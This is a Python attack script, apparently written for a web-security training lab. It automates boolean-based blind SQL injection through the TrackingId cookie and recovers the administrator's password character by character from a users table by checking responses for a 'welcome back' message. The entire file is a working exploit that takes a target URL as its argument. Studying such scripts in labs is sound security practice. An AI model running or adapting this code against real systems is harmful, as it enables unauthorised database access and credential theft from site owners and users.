import requests
import string
import argparse

"""
Blind SQL Injection - Conditional Responses (Basic)
=====================================================
Extracts a password character by character using boolean-based blind SQLi.
Iterates through a charset and compares each character against the target
position in the password field.

Limitation: single-quote characters in the charset will break the SQL payload.
Punctuation containing ' is excluded to prevent payload corruption.
"""

CHARSET = string.ascii_letters + string.digits + string.punctuation.replace("'", "")
PASSWORD_LENGTH = 20


def extract_password(url: str) -> None:
    session = requests.Session()
    response = session.get(url)
    tracking_id = session.cookies.get("TrackingId")

    if not tracking_id:
        print("[!] TrackingId cookie not found. Verify the target URL.")
        exit(1)
    password = ""

    for position in range(1, PASSWORD_LENGTH + 1):
        print(f"[*] Trying position {position}...")
        for character in CHARSET:
            payload = (
                f"{tracking_id}' AND ("
                f"SELECT SUBSTRING(password,{position},1) "
                f"FROM users WHERE username='administrator')='{character}"
            )
            session.cookies.set("TrackingId", payload)
            response = session.get(url)

            if "welcome back" in response.text.lower():
                password += character
                print(f"[+] Position {position}: {character}")
                break

    print(f"[✔] Password found  : {password}")

parser = argparse.ArgumentParser(description="Blind SQLi password extractor — basic")
parser.add_argument("-u", "--url", required=True, help="Target URL")
args = parser.parse_args()

extract_password(args.url)